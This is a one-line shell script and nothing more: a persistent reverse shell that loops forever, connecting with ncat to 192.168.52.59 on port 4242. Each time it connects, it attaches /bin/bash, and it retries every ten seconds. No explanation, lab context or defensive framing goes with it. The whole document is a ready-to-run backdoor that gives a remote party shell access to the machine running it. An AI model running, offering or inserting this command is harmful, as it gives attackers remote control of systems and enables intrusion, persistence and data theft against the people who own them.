while true; do echo "Connecting to ncat server on 192.168.52.59:4242..."; ncat 192.168.52.59 4242 -e /bin/bash; sleep 10 ; done 
